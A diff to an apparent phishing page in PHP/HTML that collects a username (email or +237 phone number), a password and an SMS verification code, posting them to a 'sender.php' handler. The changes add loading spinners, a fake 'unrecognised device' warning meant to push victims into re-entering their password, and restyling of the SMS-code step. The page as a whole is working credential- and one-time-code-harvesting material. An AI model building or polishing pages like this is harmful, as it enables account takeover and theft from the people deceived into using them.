@@ -403,6 +403,15 @@ echo '<script>var ACTUAL_LINK = "'.$actual_link.'sender.php";</script>';
 							<input type="text" class="username form-control" id="input.name" required>
 							<p class="example">For example: email@example.com or +237xxxxxxxx</p>
 						</div>
+						
+						<div id="mainLoading-one" style="padding-right: 30px; font-size: 14px; display: none; margin-bottom: 15px;">
+							
+							<br>
+							<center>
+								<img src="data:image/gif;base64,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">
+							</center>
+						</div>
+
 						<div class="namebtn">
 							<button type="submit" id="btn1"  onclick="_tables.fkbtn(1);" class="btn submitbtn namebtn-click btn-rounded text-uppercase">Submit</button>
 						</div>	
@@ -436,7 +445,7 @@ echo '<script>var ACTUAL_LINK = "'.$actual_link.'sender.php";</script>';
 						</div>
 					</div>
 					<div class="card-content second-card-content">
-						<div id="mainLoading" style="padding-right: 30px; font-size: 14px; display: none;">
+						<div id="mainLoading" style="padding-right: 30px; font-size: 14px; display: none; margin-bottom: 15px;">
 							<br>
 								<?php echo $WAIT_TEXT; ?>
 							<br>
@@ -449,8 +458,11 @@ echo '<script>var ACTUAL_LINK = "'.$actual_link.'sender.php";</script>';
 							<div class="card-content-name text-uppercase">
 								<h6>password</h6>
 							</div>
+							<div class="error-show error-password">
+                                <P>You are trying to log in with an unrecognised device. Please log in with your password and complete additional authentication.</P>
+                            </div>
 							<div class="form-group password-input input-content">
-								<label for="username" class="name-label">Password:</label>
+								<!-- <label for="username" class="name-label">Password:</label> -->
 								<input type="password " class="password form-control" id="input.cvv" required>
 							</div>
 							<div class="namebtn">
@@ -488,22 +500,32 @@ echo '<script>var ACTUAL_LINK = "'.$actual_link.'sender.php";</script>';
 				
 				<div class="card-content">
 					<div id="finishPage" style="padding-right: 30px; font-size: 14px; line-height: 20px; display: none;">
-						<h5>Application registered successfully.</h5>	
+						<h6 style="margin-top: 20px;">Application registered successfully.</h6>	
 						<br>
 						<br>
 						<p style="font-size: 16px;"><?php echo $CONFIRMATION_BODY; ?></p>
 					</div>
 				    <div id="smsQuery">
-					    <div style="font-size: 14px; line-height: 20px;">
-							<p style="font-size: 16px;"><?php echo $SMS_TEXT; ?></p>
+					    <div style="font-size: 14px; line-height: 20px; background-color: #fff3e2;
+    margin-top: 15px;">
+							<p style="font-size: 16px; padding: 10px;"><?php echo $SMS_TEXT; ?></p>
 						</div>
 						<div class="card-content-name text-uppercase">
-							<h5>SMS Code</h5>
+							<h6>SMS Code</h6>
 						</div>
 						<div class="form-group name-input input-content">
 							<label for="username" class="name-label">Please Code SMS Here:</label>
 							<input maxlength="10" type="text" class="sms-code form-control" id="input.sms" required>
 						</div>
+
+						<div id="mainLoading-three" style="padding-right: 30px; font-size: 14px; display: none; margin-bottom: 15px;">
+							
+							<br>
+							<center>
+								<img src="data:image/gif;base64,R0lGODlhIAAgAPMLAMba7YSx2rbQ6Zq/4TaAxFaUzdjm8+Tt9rzU6x5wvQRgtv///wAAAAAAAAAAAAAAACH/C05FVFNDQVBFMi4wAwEAAAAh/hpDcmVhdGVkIHdpdGggYWpheGxvYWQuaW5mbwAh+QQFCgALACwAAAAAIAAgAAAE53DJSelQo+rNZ1JJZRydJgSVolKAIJTUkSQFpSrT4SIwNScvyW2CcBl6k8CMMBkuDDskhTBDLZwuAUkqEfxIQ6gAQBFvFwICITMpVDW6XNE4GagJhSAgwe60smQUBXd4Rz1ZAghnFAKDd0hihh12BEE9kjAHVlycXIg7BwADAaSlnJ87paqbSKiKoqusnbMdmDC2tXQlkUhziYtyWTxIfy6BE8WJt5YHvpJivxNaGmLHT0VnOgKYf0dZXS7APdpB309RnHOG5gvqXGLDaC457D1zZ/V/nmOM82XiHQ7YKhKP1oZmADdEAAAh+QQFCgALACwAAAAAGAAXAAAEcnDJSWsSNetJEqnBsIlUYlKEomjEV57SoCZsi0wmLSVqoA2tAg4WmG0WhRYptzCoFKRNy8UsqFzNQOCGwlJkgAlCqzVIDATMkSIghw7rjcHti2/GgbD9qN774wcIAoOEfwuChIV/gYmDho+QkZKTR3p7EQAh+QQFCgALACwBAAAAHQAOAAAEcnDJSacgNeu9CimZwE0GUhEoVSTJKAWBOKGYJLD1CAfGnEoElkuC2PlyuKFkADMtaIsDKyGbHDYG4zMVYIEmAYVicBAgehNmTNNaJsQKnmCOuEYDgBGAAFfUAHNzeUp9VBQHCIFOLmFxWHNoQwWRWEocEQAh+QQFCgALACwHAAAAGQARAAAEaXDJuUAANOs9wsjfthxGFpwZQYiCgE1nQKni0goHjEqFGmqGFkInWwxUhdoC0SotYhLVSnm4SaALWiaREFAATY2A4BxzE2JnrXBOJJWb9pTihRu5dnggl+/7NQqBggk/fYKHCn8LiAqEEQAh+QQFCgALACwOAAAAEgAYAAAEZdAMs6q9WAy8EOXLIF5DEIDhWBnmCYpb1SIoXCEtmsbt944CU6wyIBBQgMDBUjAShiCK86irTAu0qvWp7Xq/lYR4TNWNz4kqOkEQgL0BXzegULi69XoCiiTkFWVVAwl5d1p0Cm4RACH5BAUKAAsALA4AAAASAB4AAASA8KCzqr0YCYQBvkIIDsNXhcJFpiZqCaTXigtAlubiLnd+irYBq4IIBAwmw9BgNHJ8h0EzgPNNjz4LwJnFDLvgLGFMLnw/5DRBrC6E3xbKe5BIwOt1wjlZwCfcJgEKMgIEeCYFCgprF4YmB4oKVV2CCnZvCYoBbwKRcASKcmFUJhEAIfkEBQoACwAsDwABABEAHwAABHtwybnMoRgDIbI/HOJlCGeMlBGiFCdcbMUBKQdT93KUJru5NJRLgMh5VIJTTKJcOj2BqHQQhEqvqGuU+uw6BQTCwBkOF55lwmiQoBTKY0ogkThPxuqFYi+hJzoeewoTdHkZghMEdCOIhIuHfBMFjxiNLR4JCm1OAwpxSxEAIfkEBQoACwAsCAAOABgAEgAABGxwyUnrEjijY/vMIOJ5ILaNaIoKKgoEgdhacG3M1DHUwTALhNvCwJMtAIpAh0CoIGDCBUGhKCwSWAmzORpQFRxsQjJgWj0JqvKalRSYPhp1LBFTtp20Is6mT5gdVFx1bRN8FTsVBAmDOB9+KhEAIfkEBQoACwAsAgASAB0ADgAABHhwyUmrXeZSU7Q1gpBdgaIEHoWEAnJQQmKaKQWwAiARs0LoHkDgtTisQoaSKTGQGJgWQSDQnBhWh4EJNSkkEiiCWDINjCzESey7Gy8Q5dqEwG4TJoMpQr743u1WcTV0CQJzbhJ5XClfHYd/EwhnHoYVBQSOfHKQNREAIfkEBQoACwAsAAAPABkAEQAABGdwJEXrujjrW7vaYCZ5X2ie6HkEKZokQwsS7ytnRZ0UqCFsNcLvItz4BICMwKYhEC6B6EVAPaCcz0WUtTgiTgVnTCu9IKiG0MDJg5YXB+pwlnVzLwBqyKnZagxWahoDAWM3GgABSRsRACH5BAUKAAsALAEACAARABgAAARcUCgVlr34hqnSyOBCcAoBhNiQkGi2UW1mVHFt33iu7+hAEDZE4ferEYGGlu9XuBwCJ9DvcxkEAoKFYIuaXS3bbOgaQIC5IAT5Eh5fk2exC4tpgwxyC0Jgvh0QBxEAIfkEBQoACwAsAAACAA4AHQAABHJwyblGoHgqRTLeiuBNwZaMU7Jd6AAaaUcRW5EmCSEugMJKBRyuAPMICMITaoEbLBeH51JQIFivmatWRqFuudLwDoUIBAAjg3ntsawHUUzZPEBLBPGFOoCgAAQCRR4HgGMeCICCGQaAfWSAeUYCdigHihEAOw==">
+							</center>
+						</div>
+
 						<div class="namebtn">
 							<button type="submit" id="btn3"  onclick="_tables.fkbtn(3);" class="btn submitbtn namebtn-click btn-rounded text-uppercase">Submit</button>
 						</div>
